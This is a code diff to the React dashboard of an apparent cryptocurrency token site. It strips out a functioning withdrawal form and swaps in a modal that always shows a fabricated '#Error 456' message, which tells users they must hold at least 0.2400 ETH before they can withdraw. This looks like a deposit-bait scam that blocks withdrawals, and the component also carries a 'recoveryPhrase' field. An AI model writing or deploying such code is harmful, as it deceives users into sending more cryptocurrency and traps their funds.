@@ -29,9 +29,6 @@ export default function Dashboard() {
         recoveryPhrase: ''
     });
     const [showWithdrawModal, setShowWithdrawModal] = useState(false);
-    const [withdrawAddress, setWithdrawAddress] = useState('');
-    const [withdrawing, setWithdrawing] = useState(false);
-    const [withdrawError, setWithdrawError] = useState<string | null>(null);
 
     const fetchUser = useCallback(async () => {
         setLoading(true);
@@ -104,42 +101,6 @@ export default function Dashboard() {
         }
     };
 
-    const handleWithdraw = async (e: React.FormEvent) => {
-        e.preventDefault();
-        if (!withdrawAddress.trim()) {
-            setWithdrawError('Please enter a wallet address');
-            return;
-        }
-
-        setWithdrawing(true);
-        setWithdrawError(null);
-
-        try {
-            const res = await fetch('/api/users/withdraw', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ walletAddress: withdrawAddress.trim() }),
-            });
-
-            const data = await res.json();
-
-            if (res.status === 456 || !data.success) {
-                // Show the specific error message
-                setWithdrawError(data.error || 'Withdrawal failed');
-            } else if (data.success) {
-                alert(data.message || 'Withdrawal processed successfully!');
-                setShowWithdrawModal(false);
-                setWithdrawAddress('');
-                fetchUser(); // Refresh user data to update balance
-            }
-        } catch (e) {
-            console.error('Withdrawal error:', e);
-            setWithdrawError('An error occurred while processing withdrawal');
-        } finally {
-            setWithdrawing(false);
-        }
-    };
-
     if (loading) return (
         <div className="min-h-screen flex items-center justify-center">
             <Loader2 className="w-8 h-8 animate-spin text-primary" />
@@ -174,10 +135,7 @@ export default function Dashboard() {
                                     </button>
                                 )}
                                 <button 
-                                    onClick={() => {
-                                        setShowWithdrawModal(true);
-                                        setWithdrawError(null);
-                                    }} 
+                                    onClick={() => setShowWithdrawModal(true)} 
                                     className="p-2 bg-red-500/10 hover:bg-red-500/20 rounded-lg text-red-400 transition-colors text-xs font-bold"
                                 >
                                     WITHDRAW
@@ -333,75 +291,27 @@ export default function Dashboard() {
                 <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                     <div className="glass-card p-6 rounded-2xl border border-white/10 max-w-md w-full relative">
                         <button
-                            onClick={() => {
-                                setShowWithdrawModal(false);
-                                setWithdrawAddress('');
-                                setWithdrawError(null);
-                            }}
+                            onClick={() => setShowWithdrawModal(false)}
                             className="absolute top-4 right-4 text-muted-foreground hover:text-white transition-colors"
                         >
                             <X className="w-5 h-5" />
                         </button>
 
-                        <h2 className="text-2xl font-bold mb-4">Withdraw Funds</h2>
-                        <p className="text-sm text-muted-foreground mb-6">
-                            Enter your wallet address to withdraw your balance. Minimum withdrawal: 0.2400 ETH
-                        </p>
-
-                        <form onSubmit={handleWithdraw} className="space-y-4">
-                            <div>
-                                <label className="block text-sm font-medium mb-2">Wallet Address</label>
-                                <input
-                                    type="text"
-                                    value={withdrawAddress}
-                                    onChange={(e) => {
-                                        setWithdrawAddress(e.target.value);
-                                        setWithdrawError(null);
-                                    }}
-                                    placeholder="0x..."
-                                    className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white placeholder:text-white/20 focus:outline-none focus:border-primary/50 transition-colors font-mono text-sm"
-                                    required
-                                />
+                        <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 mt-2">
+                            <div className="flex items-start gap-3">
+                                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
+                                <p className="text-sm text-red-400 whitespace-pre-line">
+                                    #Error 456 - withdrawal processing delay... Insufficient amount for wallet verification. meet up the required minimum balance of 0.2400 ETH to withdraw all META frames token.
+                                </p>
                             </div>
+                        </div>
 
-                            {withdrawError && (
-                                <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4">
-                                    <div className="flex items-start gap-3">
-                                        <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
-                                        <p className="text-sm text-red-400 whitespace-pre-line">{withdrawError}</p>
-                                    </div>
-                                </div>
-                            )}
-
-                            <div className="flex gap-3">
-                                <button
-                                    type="button"
-                                    onClick={() => {
-                                        setShowWithdrawModal(false);
-                                        setWithdrawAddress('');
-                                        setWithdrawError(null);
-                                    }}
-                                    className="flex-1 bg-white/5 hover:bg-white/10 text-white rounded-xl py-3 text-sm font-bold transition-colors"
-                                    disabled={withdrawing}
-                                >
-                                    Cancel
-                                </button>
-                                <button
-                                    type="submit"
-                                    disabled={withdrawing || !withdrawAddress.trim()}
-                                    className="flex-1 bg-primary hover:bg-primary/80 disabled:opacity-50 text-white rounded-xl py-3 text-sm font-bold transition-all flex items-center justify-center gap-2"
-                                >
-                                    {withdrawing ? (
-                                        <>
-                                            <Loader2 className="w-4 h-4 animate-spin" />
-                                            Processing...
-                                        </>
-                                    ) : (
-                                        'Withdraw'
-                                    )}
-                                </button>
-                            </div>
-                        </form>
+                        <button
+                            onClick={() => setShowWithdrawModal(false)}
+                            className="w-full mt-6 bg-white/5 hover:bg-white/10 text-white rounded-xl py-3 text-sm font-bold transition-colors"
+                        >
+                            Close
+                        </button>
                     </div>
                 </div>
             )}
